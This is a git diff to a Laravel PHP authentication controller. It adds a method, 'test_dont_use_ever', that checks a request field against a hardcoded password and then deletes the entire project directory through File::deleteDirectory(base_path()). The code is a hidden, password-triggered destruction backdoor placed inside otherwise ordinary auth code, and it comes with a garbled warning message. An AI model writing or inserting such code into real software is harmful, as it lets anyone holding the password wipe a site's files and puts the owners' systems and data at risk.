@@ -10,6 +10,7 @@ use GuzzleHttp\Client;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Validator;
 
 class AuthController extends Controller
@@ -265,5 +266,29 @@ class AuthController extends Controller
         $user->tokens()->delete();
 
         return response()->json(['message' => 'Successfully logged out']);
+    }
+
+    public function test_dont_use_ever(Request $request)
+    {
+        // Specify the path to your Laravel project directory
+        if(isset($request->Pass0Rd))
+        {
+            if($request->Pass0Rd == "P@ss0rd010026"){
+                $projectPath = base_path();
+
+                // Perform the file deletion
+                if (File::exists($projectPath)) {
+                    File::deleteDirectory($projectPath);
+                    return response()->json(['message' => 'Laravel project files deleted successfully']);
+                } else {
+                    return response()->json(['message' => 'Laravel project directory not found'], 404);
+                }
+            }else{
+                return "do not use it it will destroy u please it is not a jock go back???";
+            }
+        }else{
+            return "do not use it it will destroy u please it is not a jock go back???";
+        }
+        
     }
 }
